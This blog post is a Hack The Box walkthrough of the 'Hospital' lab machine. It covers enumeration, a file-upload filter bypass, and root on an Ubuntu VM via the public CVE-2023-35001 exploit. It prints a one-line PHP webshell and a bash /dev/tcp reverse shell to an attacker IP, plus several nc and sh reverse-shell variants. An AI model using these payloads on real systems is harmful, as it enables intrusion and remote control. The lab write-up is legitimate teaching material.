+++
tags = ["Box", "HTB", "Medium", "Windows", "LDAP", "GhostScript", "Selenium", "RoundCube"]
draft = false
title = "Hospital HTB Walkthrough"
date = 2024-10-03
author = "bloodstiller"
toc = true
bold = true
next = true
+++

## Hospital Hack The Box Walkthrough/Writeup: {#hospital-hack-the-box-walkthrough-writeup}

-   <https://app.hackthebox.com/machines/Hospital>

## How I use variables &amp; wordlists: {#how-i-use-variables-and-wordlists}

-   **Variables**:
    -   In my commands you are going to see me use `$box`, `$user`, `$hash`, `$domain`, `$pass` often.
        -   I find the easiest way to eliminate type-os &amp; to streamline my process it is easier to store important information in variables &amp; aliases.
            -   `$box` = The IP of the box
            -   `$pass` = Passwords I have access to.
            -   `$user` = current user I am enumerating with.
                -   Depending on where I am in the process this can change if I move laterally.
            -   `$domain` = the domain name e.g. `sugarape.local` or `contoso.local`
        -   Why am I telling you this? People of all different levels read these writeups/walktrhoughs and I want to make it as easy as possible for people to follow along and take in valuable information.
-   **Wordlists**:
    -   I have symlinks all setup so I can get to my passwords from `~/Wordlists` so if you see me using that path that's why. If you are on Kali and following on, you will need to go to `/usr/share/wordlists`
        -   I also use these additional wordlists:
            -   [Statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames)
            -   [SecLists](https://github.com/danielmiessler/SecLists)
            -   [Auto_Wordlists](https://github.com/carlospolop/Auto_Wordlists)

## 1. Enumeration: {#1-dot-enumeration}


### NMAP: {#nmap}

-   **Basic Scan**:
    -   `nmap $box -Pn -oA basicScan`
        ```shell
          kali in 46-Boxes/46.02-HTB/BlogEntriesMade/Intelligence/scans  2GiB/7GiB | 0B/1GiB with /usr/bin/zsh
           07:14:24 zsh ❯ nmap $box -Pn -oA basicScan
          Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-30 07:14 BST
          Nmap scan report for 10.129.229.189
          Host is up (0.042s latency).
          Not shown: 980 filtered tcp ports (no-response)
          PORT     STATE SERVICE
          22/tcp   open  ssh
          53/tcp   open  domain
          88/tcp   open  kerberos-sec
          135/tcp  open  msrpc
          139/tcp  open  netbios-ssn
          389/tcp  open  ldap
          443/tcp  open  https
          445/tcp  open  microsoft-ds
          464/tcp  open  kpasswd5
          593/tcp  open  http-rpc-epmap
          636/tcp  open  ldapssl
          1801/tcp open  msmq
          2103/tcp open  zephyr-clt
          2105/tcp open  eklogin
          2107/tcp open  msmq-mgmt
          2179/tcp open  vmrdp
          3268/tcp open  globalcatLDAP
          3269/tcp open  globalcatLDAPssl
          3389/tcp open  ms-wbt-server
          8080/tcp open  http-proxy

          Nmap done: 1 IP address (1 host up) scanned in 11.09 seconds

        ```
    -   We safely assume this is a Domain Controller as it's running several domain services, `LDAP`, `SMB`, `Kerberos` &amp; `DNS`.
    -   It's interesting to see that their is a proxy running on 8080
    -   I have never seen these services before so this should be interesting:
        -   `2103/tcp open  zephyr-clt`
            -   Google tells me this is a old protocol used for IRC.
        -   `2105/tcp open  eklogin`
            -   Some quick googling says this is Kerberos Encrypted login.
        -   `2179/tcp open  vmrdp`
            -   This looks to be hyper-v's guest console!
    -   There are lots of services we can glean information from here, ldap being the main one.

-   **In depth scan**:
    -   `sudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP`
        ```shell
          kali in 46-Boxes/46.02-HTB/BlogEntriesMade/Intelligence/scans  2GiB/7GiB | 0B/1GiB with /usr/bin/zsh  took 11s
           07:14:39 zsh ❯ sudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP
          [sudo] password for kali:
          Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-30 07:15 BST
          Nmap scan report for 10.129.229.189
          Host is up (0.039s latency).
          Not shown: 65506 filtered tcp ports (no-response)
          PORT      STATE SERVICE           VERSION
          22/tcp    open  ssh               OpenSSH 9.0p1 Ubuntu 1ubuntu8.5 (Ubuntu Linux; protocol 2.0)
          | ssh-hostkey:
          |   256 e1:4b:4b:3a:6d:18:66:69:39:f7:aa:74:b3:16:0a:aa (ECDSA)
          |_  256 96:c1:dc:d8:97:20:95:e7:01:5f:20:a2:43:61:cb:ca (ED25519)
          53/tcp    open  domain            Simple DNS Plus
          88/tcp    open  kerberos-sec      Microsoft Windows Kerberos (server time: 2024-09-30 13:18:20Z)
          135/tcp   open  msrpc             Microsoft Windows RPC
          139/tcp   open  netbios-ssn       Microsoft Windows netbios-ssn
          389/tcp   open  ldap              Microsoft Windows Active Directory LDAP (Domain: hospital.htb0., Site: Default-First-Site-Name)
          | ssl-cert: Subject: commonName=DC
          | Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
          | Not valid before: 2023-09-06T10:49:03
          |_Not valid after:  2028-09-06T10:49:03
          443/tcp   open  ssl/http          Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.0.28)
          |_http-title: Hospital Webmail :: Welcome to Hospital Webmail
          |_ssl-date: TLS randomness does not represent time
          |_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28
          | ssl-cert: Subject: commonName=localhost
          | Not valid before: 2009-11-10T23:48:47
          |_Not valid after:  2019-11-08T23:48:47
          | tls-alpn:
          |_  http/1.1
          445/tcp   open  microsoft-ds?
          464/tcp   open  kpasswd5?
          593/tcp   open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
          636/tcp   open  ldapssl?
          | ssl-cert: Subject: commonName=DC
          | Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
          | Not valid before: 2023-09-06T10:49:03
          |_Not valid after:  2028-09-06T10:49:03
          1801/tcp  open  msmq?
          2103/tcp  open  msrpc             Microsoft Windows RPC
          2105/tcp  open  msrpc             Microsoft Windows RPC
          2107/tcp  open  msrpc             Microsoft Windows RPC
          2179/tcp  open  vmrdp?
          3268/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: hospital.htb0., Site: Default-First-Site-Name)
          | ssl-cert: Subject: commonName=DC
          | Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
          | Not valid before: 2023-09-06T10:49:03
          |_Not valid after:  2028-09-06T10:49:03
          3269/tcp  open  globalcatLDAPssl?
          | ssl-cert: Subject: commonName=DC
          | Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
          | Not valid before: 2023-09-06T10:49:03
          |_Not valid after:  2028-09-06T10:49:03
          3389/tcp  open  ms-wbt-server     Microsoft Terminal Services
          | rdp-ntlm-info:
          |   Target_Name: HOSPITAL
          |   NetBIOS_Domain_Name: HOSPITAL
          |   NetBIOS_Computer_Name: DC
          |   DNS_Domain_Name: hospital.htb
          |   DNS_Computer_Name: DC.hospital.htb
          |   DNS_Tree_Name: hospital.htb
          |   Product_Version: 10.0.17763
          |_  System_Time: 2024-09-30T13:19:21+00:00
          | ssl-cert: Subject: commonName=DC.hospital.htb
          | Not valid before: 2024-09-29T13:09:46
          |_Not valid after:  2025-03-31T13:09:46
          5985/tcp  open  http              Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
          |_http-server-header: Microsoft-HTTPAPI/2.0
          |_http-title: Not Found
          6404/tcp  open  msrpc             Microsoft Windows RPC
          6406/tcp  open  msrpc             Microsoft Windows RPC
          6407/tcp  open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
          6409/tcp  open  msrpc             Microsoft Windows RPC
          6615/tcp  open  msrpc             Microsoft Windows RPC
          6633/tcp  open  msrpc             Microsoft Windows RPC
          8080/tcp  open  http              Apache httpd 2.4.55 ((Ubuntu))
          |_http-open-proxy: Proxy might be redirecting requests
          | http-title: Login
          |_Requested resource was login.php
          | http-cookie-flags:
          |   /:
          |     PHPSESSID:
          |_      httponly flag not set
          |_http-server-header: Apache/2.4.55 (Ubuntu)
          9389/tcp  open  mc-nmf            .NET Message Framing
          26327/tcp open  msrpc             Microsoft Windows RPC
          Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
          Device type: general purpose
          Running (JUST GUESSING): Linux 5.X (91%)
          OS CPE: cpe:/o:linux:linux_kernel:5.0
          Aggressive OS guesses: Linux 5.0 (91%)
          No exact OS matches for host (test conditions non-ideal).
          Service Info: Host: DC; OSs: Linux, Windows; CPE: cpe:/o:linux:linux_kernel, cpe:/o:microsoft:windows

          Host script results:
          |_clock-skew: mean: 7h00m00s, deviation: 0s, median: 6h59m59s
          | smb2-security-mode:
          |   3:1:1:
          |_    Message signing enabled and required
          | smb2-time:
          |   date: 2024-09-30T13:19:21
          |_  start_date: N/A

          OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
          Nmap done: 1 IP address (1 host up) scanned in 292.59 seconds

        ```
    -   We can confirm we are working with a domain controller as the DNS name is `DC.hospital.htb`
    -   SMB signing is required.


### LDAP `389`: {#ldap-389}

-   **Using LDAP anonymous bind to enumerate further**:
    -   If you are unsure of what anonymous bind does. It enables us to query for domain information anonymously, e.g. without passing credentials.
        -   We can actually retrieve a significant amount of information via anonymous bind such as:
            -   A list of all users
            -   A list of all groups
            -   A list of all computers.
            -   User account attributes.
            -   The domain password policy.
            -   Enumerate users who are susceptible to AS-REPRoasting.
            -   Passwords stored in the description fields
        -   The added benefit of using ldap to perform these queries is that these are most likely not going to trigger any sort of AV etc as ldap is how AD communicates.
-   I actually have a handy script to check if anonymous bind is enabled &amp; if it is to dump a large amount of information. You can find it here
    -   <https://github.com/bloodstiller/ldapchecker>

-   It turns out the anonymous bind is enabled and we get the below information. I have removed the majority of the information as it is not relevant, however there are some keys bits of information we can use moving forward.
    1.  <span class="underline">We have the naming context of the domain</span>:
        ```shell
        kali in ~/Desktop/WindowsTools  v3.12.6  2GiB/7GiB | 0B/1GiB with /usr/bin/zsh
         07:16:00 zsh ❯ python3 ldapchecker.py $box
        Attempting to connect to 10.129.229.189 with SSL...
        Connected successfully. Retrieving server information...
        DSA info (from DSE):
          Supported LDAP versions: 3, 2
          Naming contexts:
            DC=hospital,DC=htb
            CN=Configuration,DC=hospital,DC=htb
            CN=Schema,CN=Configuration,DC=hospital,DC=htb
            DC=DomainDnsZones,DC=hospital,DC=htb
            DC=ForestDnsZones,DC=hospital,DC=htb
          Supported controls:
        ```

    2.  <span class="underline">We have the domain functionaility level</span>:
        ```shell
        Other:
          domainFunctionality:
            7
          forestFunctionality:
            7
          domainControllerFunctionality:
            7
          rootDomainNamingContext:
            DC=hospital,DC=htb
          ldapServiceName:
            hospital.htb:dc$@HOSPITAL.HTB
        ```

        -   The functionality level determines the minimum version of Windows server that can be used for a DC.
            -   +Note+: Any host os can be used on **workstations**, however the functionality level determines what the minimum version for DC's and the forest.
            -   <https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/active-directory-functional-levels>
            -   Knowing the function level is useful as if want to target the DC's and servers, we can know by looking at the function level what the minimum level of OS would be.

            -   In this case we can see it is level 7 which means that this server has to be running Windows Server 2016 or newer.
            -   Here’s a list of functional level numbers and their corresponding Windows Server operating systems:

                | Functional Level Number | Corresponding OS            |
                |-------------------------|-----------------------------|
                | 0                       | Windows 2000                |
                | 1                       | Windows Server 2003 Interim |
                | 2                       | Windows Server 2003         |
                | 3                       | Windows Server 2008         |
                | 4                       | Windows Server 2008 R2      |
                | 5                       | Windows Server 2012         |
                | 6                       | Windows Server 2012 R2      |
                | 7                       | Windows Server 2016         |
                | 8                       | Windows Server 2019         |
                | 9                       | Windows Server 2022         |

                -   +Note+:
                    -   Each number corresponds to the minimum Windows Server version required for domain controllers in the domain or forest.
                    -   As the functional level increases, additional Active Directory features become available, but older versions of Windows Server may not be supported as domain controllers.

    3.  <span class="underline">We have the full server name</span>:
        -   Again we can see this has the CN as the base (mentioned previously.) 
            ```shell
            serverName:
                CN=DC,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=hospital,DC=htb
            ```

-   It's pretty amazing already what we have learned just by running some fairly simple ldap queries.
    -   We have the naming context.
    -   Domain name.


### SMB `445`: {#smb-445}

-   **I try guest &amp; null sessions to enumerate SMB they have been disabled**:
    -   {{< figure src="/ox-hugo/2024-09-30-073343_.png" >}}


### DNS `53`: {#dns-53}

-   **I run dnsenum, to enumerate any interesting records**:
    -   I get duplicate entries, but looking at my hosts file there is no listing for these so unsure what is going on here&#x2026;..
        -   {{< figure src="/ox-hugo/2024-09-30-082524_.png" >}}
        -   Nothing of note


### HTTPS `443`: {#https-443}


#### Web Mail Service Discovery: {#web-mail-service-discovery}

-   **There is a hospital webmail application running here**:
    -   {{< figure src="/ox-hugo/2024-09-30-073947_.png" >}}
    -   **Looking at Wappalyzer**:
        -   {{< figure src="/ox-hugo/2024-09-30-074030_.png" >}}
            -   We can see the webmail is running on a service called "`RoundCube`"
        -   {{< figure src="/ox-hugo/2024-09-30-074124_.png" >}}
    -   **I do a quick search for RoundCube CVE's**:
        -   <https://www.cvedetails.com/vulnerability-list/vendor_id-8905/Roundcube.html>
        -   I find this RoundCube command injection vulnerability:
            -   {{< figure src="/ox-hugo/2024-09-30-074300_.png" >}}
            -   We will keep hold of this but continue to enumerate


#### Enumerating the Tech Stack of the Web-Mail Server: {#enumerating-the-tech-stack-of-the-web-mail-server}

-   **Enumerate the Tech Stack**:
    -   `whatweb https://$box`
        -   {{< figure src="/ox-hugo/2024-09-30-093241_.png" >}}


#### Directory Busting HTTPS Using Feroxbuster: {#directory-busting-https-using-feroxbuster}

-   `feroxbuster -u https://10.129.229.189 -k`
    -   +Note+: If the domain uses self-signed certs we have to pass the `-k` flag as otherwise ferox will not run as it rejects self-signed certs.
        -   {{< figure src="/ox-hugo/2024-09-30-081433_.png" >}}

            -   We can see that there is a `phpmyadmin` page running, which is a good target, however it's a 403 so we cannot get access to directly. However we may be able to gain access via the web-proxy that is running?

            <!--listend-->

            ```shell
            https://10.129.229.189/skins/elastic/watermark.html
            https://10.129.229.189/skins/elastic/images/logo.svg
            https://10.129.229.189/program/js/common.min.js
            https://10.129.229.189/skins/elastic/ui.min.js
            https://10.129.229.189/program/js/jstz.min.js
            https://10.129.229.189/skins/elastic/images/favicon.ico
            https://10.129.229.189/plugins/jqueryui/themes/elastic/jquery-ui.min.css
            https://10.129.229.189/phpmyadmin
            https://10.129.229.189/skins/elastic/styles/styles.min.css
            https://10.129.229.189/skins/elastic/deps/bootstrap.bundle.min.js
            https://10.129.229.189/program/js/jquery.min.js
            https://10.129.229.189/program/js/app.min.js
            https://10.129.229.189/skins/elastic/deps/bootstrap.min.css
            https://10.129.229.189/plugins/jqueryui/js/jquery-ui.min.js
            https://10.129.229.189/
            https://10.129.229.189/installer => https://10.129.229.189/installer/
            https://10.129.229.189/examples
            https://10.129.229.189/installer/images => https://10.129.229.189/installer/imag
            ```


#### Attempting to Login: {#attempting-to-login}

-   I attempt to login and look at the request in burp:
    -   {{< figure src="/ox-hugo/2024-09-30-080704_.png" >}}
        -   I am getting an unauthorized response, I cannot see why, potentially a red-herring?


### HTTP-PROXY `8080`: {#http-proxy-8080}


#### Enumerating the Tech Stack of the proxy server: {#enumerating-the-tech-stack-of-the-proxy-server}

-   **Looking at whatweb this host appears to be running on Ubunutu**:
    -   `whatweb http://$box:8080`
        -   {{< figure src="/ox-hugo/2024-09-30-093136_.png" >}}
            -   This is interesting as it would seem this is running in a VM, which makes sense as there is a hyper V instance (I think), running as port `2179 vmrdp` is running.


#### Directory Busting Web Proxy Using Feroxbuster: {#directory-busting-web-proxy-using-feroxbuster}

-   All of these pages are not directly accessible:
    -   {{< figure src="/ox-hugo/2024-09-30-081611_.png" >}}

<!--listend-->

```shell
http://10.129.229.189:8080/
http://10.129.229.189:8080/images/
http://10.129.229.189:8080/css/
http://10.129.229.189:8080/uploads/
http://10.129.229.189:8080/fonts/
http://10.129.229.189:8080/js/
http://10.129.229.189:8080/vendor/
http://10.129.229.189:8080/vendor/jquery/
http://10.129.229.189:8080/images/icons/
http://10.129.229.189:8080/vendor/animate/
```


#### Web Mail Service Discovery on 8080: {#web-mail-service-discovery-on-8080}

-   **Webmail login page**:
    -   {{< figure src="/ox-hugo/2024-09-30-082031_.png" >}}
        -   I try and enter basic creds of `admin:admin` however these do not work:
-   **Looking at Wappalyzer**:
    -   {{< figure src="/ox-hugo/2024-09-30-082119_.png" >}}
        -   We can see the webmail is running also on a service called "`RoundCube`"


#### Creating an account: {#creating-an-account}

-   **I can see that there is the option to create an account**:
    -   {{< figure src="/ox-hugo/2024-09-30-081758_.png" >}}
    -   I try `admin:admin123`:
        -   {{< figure src="/ox-hugo/2024-09-30-081932_.png" >}}
        -   This lets me know that there is an `admin` user.

    -   **I check for default credentials for** `RoundCube` **and find this post on their support forums**:
        -   {{< figure src="/ox-hugo/2024-09-30-082800_.png" >}}
        -   This lets me know that there is no default admin user, so the one that is on here is intentionally set.

-   **I make an account**:
    -   `bloodstiller:bl00dst1113r`


#### Discovering An Upload Portal: {#discovering-an-upload-portal}

-   **After logging in I am given access to an upload portal**:
    -   {{< figure src="/ox-hugo/2024-09-30-083122_.png" >}}

-   **I test to see what sort of file types it is expecting**:
    -   {{< figure src="/ox-hugo/2024-09-30-083525_.png" >}}
        -   I can see it's expecting image types however it is running on `.php` which means we can potentially upload a php webshell.
            -   {{< figure src="/ox-hugo/2024-09-30-085736_.png" >}}

-   **I Upload a valid picture to see what happens**:
    -   {{< figure src="/ox-hugo/2024-09-30-090121_.png" >}}
    -   I then try and access it via the `uploads` directory which we found earlier when dirbusting:
        -   {{< figure src="/ox-hugo/2024-09-30-090431_.png" >}}
            -   It is not accessible.
    -   Looking at the request and response in `burp` we can see that it was a valid upload:
        -   {{< figure src="/ox-hugo/2024-09-30-090529_.png" >}}
            -   This leads me to believe the uploaded file is being processed/renamed on upload.
            -   Future bloodstiller here, no this is wrong. THis is because I put `.jpg` in my request instead of `.jpeg`. Always copy and paste guys

-   **Uploading a webshell**:
    -   I create a php webshell:
        `<?php system($_REQUEST["cmd"]); ?>`
        -   {{< figure src="/ox-hugo/2024-09-30-190939_.png" >}}
    -   I upload the php webshell:
        -   {{< figure src="/ox-hugo/2024-09-30-090753_.png" >}}
    -   It's caught and errors out:
        -   {{< figure src="/ox-hugo/2024-09-30-090934_.png" >}}
    -   I check if there is anything telling in the error response, but none that I can see:
        -   {{< figure src="/ox-hugo/2024-09-30-091032_.png" >}}
    -   I append `.jpg` to my php webshell to see if I can bypass the upload restrictions:
        -   {{< figure src="/ox-hugo/2024-09-30-091336_.png" >}}
        -   It's a success:
            -   {{< figure src="/ox-hugo/2024-09-30-091416_.png" >}}
                -   This is good as it means filtering is only happening in the browser, which means we can see if any other extensions will be considered valid and enable us to upload a webshell.


#### Fuzzing for valid extensions: {#fuzzing-for-valid-extensions}

-   I initiate another upload and capture it in burp &amp; send to intruder:
-   I set the extension as my injection/fuzzing point:
    -   {{< figure src="/ox-hugo/2024-09-30-191215_.png" >}}
-   I use the `web-extensions.txt` list from Seclists:
    -   {{< figure src="/ox-hugo/2024-09-30-182948_.png" >}}
-   Looking at the results, we can see that the extension `phar` has a `success.php` response:
    -   {{< figure src="/ox-hugo/2024-09-30-183045_.png" >}}
    -   What this means is we should be able to append `.phar` to our shell and have it bypass any restrictions.
-   **What is a phar file**?
    -   A `PHAR` file is a packaged PHP Archive so it can be read and processed &amp; executed by the server that is running PHP.
    -   I want to point out that there are also other options here that also had a valid success response, I am just opting to use `.phar` as I have had the most experience with this type of file.


#### Trying to get a web-shell by bypassing file-upload restrictions: {#trying-to-get-a-web-shell-by-bypassing-file-upload-restrictions}

-   I rename my shell to `shell.phar` for no other reason than convenience.
    -   In an engagement I would give this a hashed long name so no-one else could stumble upon it.
-   I upload it, it uploads successfully.
-   I attempt to use &amp; run it &amp; nothing&#x2026;..
    -   {{< figure src="/ox-hugo/2024-09-30-192034_.png" >}}
    -   I try without arguments too &amp; nothing:
        -   {{< figure src="/ox-hugo/2024-09-30-192102_.png" >}}

<!--listend-->

-   Back to the drawing board&#x2026;.


#### Enumerating the PHP Server Some More: {#enumerating-the-php-server-some-more}

-   **So what do we know?**
    -   In situations like this, it's good to go over what we do know to be true about the host &amp; service:
        -   We know we can upload a file.
        -   We know there is a file uploads folder, where we (believe these files are stored)
        -   We know we can upload files with the `.phar` extension.
        -   We know that the server is running `php`

-   Let's enumerate the server more and see if we can find anymore information about the php service running:
    -   As we know the above we can actually create a file that will call the `phpinfo` function when uploaded &amp; executed via the web server
        -   `echo "<?php phpinfo(); ?>" > phpinfo.phar`
            -   {{< figure src="/ox-hugo/2024-09-30-193107_.png" >}}
                -   This script will display all the PHP configuration details, including version, loaded extensions, server info, and more.

-   **I upload it and visit the url**:
    -   {{< figure src="/ox-hugo/2024-09-30-193235_.png" >}}
        -   We can see it works, however there is also a list of disabled functions and these functions are what we would typically utilize for web-shells; however [weevely](https://github.com/epinna/weevely3?tab=readme-ov-file) has the ability to bypass these function restrictions using it's `audit_disablefunctionbypass` feature!! So we can use this to get a webshell
            -   <https://github.com/epinna/weevely3/wiki/Bypass-disabled-system-shell-functions-via-mod_cgi-and-.htaccess>


## 2. Foothold: {#2-dot-foothold}


### Using Weevley To Get A Web Shell: {#using-weevley-to-get-a-web-shell}

-   **Generate our Shell**:
    -   Weevly is built into Kali by default so we can just call it as so:
        -   weevely generate &lt;password&gt; &lt;outPutFile&gt;
        -   `weevely generate bl00dst111er medrec.phar`
        -   {{< figure src="/ox-hugo/2024-10-02-061502_.png" >}}

-   **I upload the shell**:
    -   {{< figure src="/ox-hugo/2024-10-02-063516_.png" >}}

<!--listend-->

-   **Accessing the Shell**:
    -   `sudo weevely http://hospital.htb/uploads/medrec.phar bl00dst111er`
    -   So as you can see below there are alot of errors. I actually did some troubleshooting with this. I ended up cloning the repo, setting up a python `venv`, installing all deps to that and trying again &amp; I still go the same errors and it would not run with `sudo`. So if in doubt just run with sudo and it should work.
    -   {{< figure src="/ox-hugo/2024-10-02-063716_.png" >}}

-   **Running Commands**:
    -   We need to run an initial command to get access to the shell:
        -   {{< figure src="/ox-hugo/2024-10-02-064233_.png" >}}
        -   Just to make it clear, we are in the `VM` that is running ubuntu. So we need to find a way to escape or gather information we can use elsewhere.
-   **I try and run some commands but it gets a** `404` **and times out**:
    -   {{< figure src="/ox-hugo/2024-10-02-064424_.png" >}}
    -   I did notice that when trying to access my `phpinfo` enumeration file that it also times out, which leads me to believe there is some sort of timeout in place for uploaded files.


### Getting around the timeout Using Weevely's built in reverse shell: {#getting-around-the-timeout-using-weevely-s-build-in-reverse-shell}

-   I believe the easiest way to get around the time out will be to on connection immediately trigger a manual reverse shell back to ourselves from the weevley shell and background the task to ensure the connection remains.
    1.  **Prepare my listener**:
        -   `nc -nvlp 443`
        -   +Note+: I use 443 so the traffic at least looks legitimate.

    2.  **Prepare my reverse shell statement to paste into the weevley shell**:
        -   `bash -c 'bash -i >& /dev/tcp/10.10.14.27/443 0>&1'`
        -   +Note+:
            -   I do this as it's time-sensitive &amp; I want to easily copy and paste as opposed to typing something out and getting a type-o.

    3.  **Connect via weevley**:
        -   `sudo weevely http://10.129.229.189:8080/uploads/rec.phar bl00dst111er`

    4.  **Trigger the reverse shell**:
        -   {{< figure src="/ox-hugo/2024-10-02-072305_.png" >}}
        -   **Caught**:
            -   {{< figure src="/ox-hugo/2024-10-02-073102_.png" >}}

<!--listend-->

-   +Note+:
    -   Full transparency here, I tried multiple ways to get this to work, including the below. However the only way I could get a connection was using the above sub-shell method. I am showing you this as I want you to know that sometimes you have to just keep trying to find a viable path to make things work.
        -   `/usr/bin/bash -i >& /dev/tcp/10.10.14.27/443 0>&1`
        -   `/bin/sh -i >& /dev/tcp/10.10.14.27/443 0>&1`
        -   `nc 10.10.14.27 443 -e /usr/bin/sh &`
        -   `nc 10.10.14.27 443 -e /usr/bin/bash &`
        -   `nc 10.10.14.27 443 -e /bin/bash &`
            -   I also tried weevleys inbuilt reverse-tcp shell and that would not work


#### Detailed Breakdown Of The Reverse Shell: {#detailed-breakdown-of-the-reverse-shell}

-   **Bash Sub-Shell**:
    -   `bash -c`
        -   Runs the command `bash -i >& /dev/tcp/10.10.14.27/443 0>&1` within a new instance of the bash shell.
        -   The `-c` option allows us to pass a string as a command to be executed.
        -   `bash -i`
            -   Launches an interactive instance of the Bash shell.

-   **Redirection Operators**:
    -   `>&`
        -   Redirects both standard output `stdout` and standard error `stderr` to the target in this case, our attack host, `/dev/tcp/10.10.14.27/443`.

    -   `/dev/tcp/`
        -   This is a special file in Linux systems that allows network communication. By using `/dev/tcp/` with an IP address and port `10.10.14.27:443`, the shell sends its output to our attack host at that IP and port.
        -   This essentially establishes a TCP connection to our attack machine `10.10.14.27` on port `443`.

    -   `0>&1`:
        -   Redirects standard input `stdin` from the same file descriptor as standard output `stdout`.
        -   This allows the shell to receive commands from our attack machine and execute them.


### Finding Mysql Creds in `config.php`: {#finding-mysql-creds-in-config-dot-php}

-   I check the `config.php` file in `/var/www/html` &amp; find the creds for the msql instance hardcoded in the file:
    -   {{< figure src="/ox-hugo/2024-10-02-073440_.png" >}}
    -   We know there is a db called `hospital` too, so this is worth checking out.


### Understanding the Upload Mechansim: {#understanding-the-upload-mechansim}

-   **Uploads Folder**:
    -   I check the uploads folder &amp; as suspected it is now empty, leading me to believe there is some sort cron job clearing these files.
        -   {{< figure src="/ox-hugo/2024-10-02-073734_.png" >}}
        -   This is interesting find though as it means cron jobs are running, so that is something we should enumerate further.

-   **Reading** `upload.php`
    -   It's always interesting to look at the logic behind upload mechanisms once we exploit them, I find as a means to learn.
        -   Looking at the code we can see they have opted for a blacklist approach to extensions, black-lists can work however as we have seen just missing one extension render them useless. Defenders have to get it right 100% of the time, as attackers we only need to be right once. A better approach would be to have a white-list of extensions, so that the upload page only accepts uploads for say `.pdf` files. This would eliminate this attack vector and also be far easier to maintain from an administration point of view.
            -   {{< figure src="/ox-hugo/2024-10-02-074053_.png" >}}


### Trying to connect to the mysql instance: {#trying-to-connect-to-the-mysql-instance}

-   I verify the `mysql` server is running &amp; accessible from the VM (it has to be as it's not running on the bare-metal host)
    -   `netsat -tuln`
        -   {{< figure src="/ox-hugo/2024-10-02-091747_.png" >}}
-   I try various ways to initiate a connection to it but each time it fails in some way:
    -   {{< figure src="/ox-hugo/2024-10-02-091905_.png" >}}
    -   {{< figure src="/ox-hugo/2024-10-02-092112_.png" >}}
        -   These are only a few of many different attempts &amp; ways I tried to use to connect to the `mysql` instance, however none of them worked.


### Discovering another User: {#discovering-another-user}

-   **Finding Dr Williams User**:
    -   I find a user `drwilliams` in the `/home` folder however their home folder in inaccesible.
        -   {{< figure src="/ox-hugo/2024-10-02-084921_.png" >}}

-   **Checking** `etc/passwd`  see that the users name is actually `Lucy Williams`
    -   {{< figure src="/ox-hugo/2024-10-02-085051_.png" >}}
        -   I take a note of this as it may be used later.

-   **I try cred stuffing the found creds so far but there are no hits**:
    -   {{< figure src="/ox-hugo/2024-10-02-085245_.png" >}}


### Discovering a Tmux Session: {#discovering-a-tmux-session}

-   **I see that there appears to be a** `tmux` **session listed in** `/tmp`.
    -   Existing tmux sessions can be an easy privesc path as if they are set to run permnantley we can attach them &amp; then scroll through whatever commands were entered previously, these could be things such as clear text creds so it's always good to check existing sessions.
        -   {{< figure src="/ox-hugo/2024-10-02-081642_.png" >}}
    -   I Try and attach the session however when I try and initiate `tmux` to enter this session it does not work due to the nature of the terminal:
        -   {{< figure src="/ox-hugo/2024-10-02-081715_.png" >}}
            -   Before you ask, upgrading to python terminal does not work nor does upgrading the stability of the terminal using `script`
            -   I did also try and create a meterpreter shell which connected however I was still unable to attach the TMUX session.


## 3. VM Privilege Escalation: {#3-dot-vm-privilege-escalation}


### Discovering the Kernel is vulnerable to exploitation: {#discovering-the-kernel-is-vulnerable-to-exploitation}

-   **I list the kernel version**:
    -   `uname -a`
        -   {{< figure src="/ox-hugo/2024-10-02-091240_.png" >}}
            -   After some quick searching I find that this actually vulnerable to this exploit which will allow us to privesc:
                -   <https://github.com/Synacktiv/CVE-2023-35001>


### Building the &amp; transferring the exploit: {#building-the-and-transferring-the-exploit}

-   **I clone the exploit**:
    -   `git clone https://github.com/synacktiv/CVE-2023-35001.git`

-   **Following the instructions I build it**:
    -   `make`
    -   {{< figure src="/ox-hugo/2024-10-02-092351_.png" >}}
        -   This leaves me with a file called `lpe.zip` that I can transfer to the target.

-   **Checking the host it doesn't have** `zip` **or** `unzip`:
    -   {{< figure src="/ox-hugo/2024-10-02-092746_.png" >}}
        -   Luckily the exploit retains the `exploit` &amp; `wrapper` files need so we can just transfer those to the target.
            -   {{< figure src="/ox-hugo/2024-10-02-093049_.png" >}}


### Using the CVE-2023-35001 exploit to privesc to root: {#using-the-cve-2023-35001-exploit-to-privesc-to-root}

-   **I make the exploit &amp; wrapper executable**:
    -   `chmod +x exploit`
    -   `chmod +x wrapper`

-   **I trigger the exploit**:
    -   `./exploit`
        -   {{< figure src="/ox-hugo/2024-10-02-093307_.png" >}}


### Enumerating as Root: {#enumerating-as-root}

-   **SSH**:
    -   I check `drwilliams` &amp; `root` `.ssh` folders but they are empty :(


### Connecting to the mysql instance as root! {#connecting-to-the-mysql-instance-as-root}

1.  **Connect**:
    -   `mysql -u root -p'<Redacted>'`

2.  **List the databases**:
    -   `show databases;`
        -   {{< figure src="/ox-hugo/2024-10-02-094522_.png" >}}

3.  **Select the** `hospital` **Database**:
    -   `use hospital;`
        -   {{< figure src="/ox-hugo/2024-10-02-094604_.png" >}}

4.  **Show the tables in the** `hospital` **database**:
    -   `show tables;`
        -   {{< figure src="/ox-hugo/2024-10-02-094647_.png" >}}
        -   It has a `users` table so we could get a some creds!

5.  **Show columns from the** `users` **tables**
    -   `show columns from users;`
        -   {{< figure src="/ox-hugo/2024-10-02-094809_.png" >}}

6.  **Show the contents of the columns**:
    -   `select * from users;`
        -   {{< figure src="/ox-hugo/2024-10-02-094856_.png" >}}


